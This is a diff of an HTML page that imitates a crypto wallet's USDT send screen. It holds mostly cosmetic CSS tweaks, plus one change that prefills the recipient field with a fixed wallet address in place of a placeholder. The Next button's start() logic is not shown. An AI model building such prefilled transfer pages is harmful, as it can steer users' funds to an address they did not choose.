@@ -46,6 +46,7 @@
       border: 1px solid #2c2c2c;
       display: flex;
       align-items: center;
+      height: 52px;
     }
     .input-box input {
       flex: 1;
@@ -53,7 +54,8 @@
       border: none;
       outline: none;
       color: #fff;
-      font-size: 15px;
+      font-size: 14px;
+      padding-top: 2px;
     }
     .input-box input::placeholder {
       color: #888;
@@ -62,7 +64,7 @@
       margin-left: 10px;
       display: flex;
       gap: 12px;
-      font-size: 14px;
+      font-size: 13px;
     }
     .input-actions span {
       color: #00ff99;
@@ -112,15 +114,17 @@
   </header>
 
   <div class="container">
+    <!-- Wallet Address Input -->
     <label>Address or Domain Name</label>
     <div class="input-box">
-      <input type="text" id="wallet" placeholder="0x1956B3950A..." />
+      <input type="text" id="wallet" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" />
       <div class="input-actions">
         <span onclick="document.getElementById('wallet').value=''">✕</span>
         <span onclick="navigator.clipboard.readText().then(text => document.getElementById('wallet').value = text)">Paste</span>
       </div>
     </div>
 
+    <!-- Amount Input -->
     <label>Amount</label>
     <div class="input-box amount-box">
       <input type="text" id="amount" placeholder="USDT Amount" />
@@ -128,9 +132,11 @@
       <span class="input-actions" onclick="document.getElementById('amount').value='100'">Max</span>
     </div>
 
+    <!-- USD Display -->
     <div class="usd">≈ $0.00</div>
   </div>
 
+  <!-- Button -->
   <div class="fixed-button">
     <button id="nextBtn" onclick="start()">Next</button>
   </div>
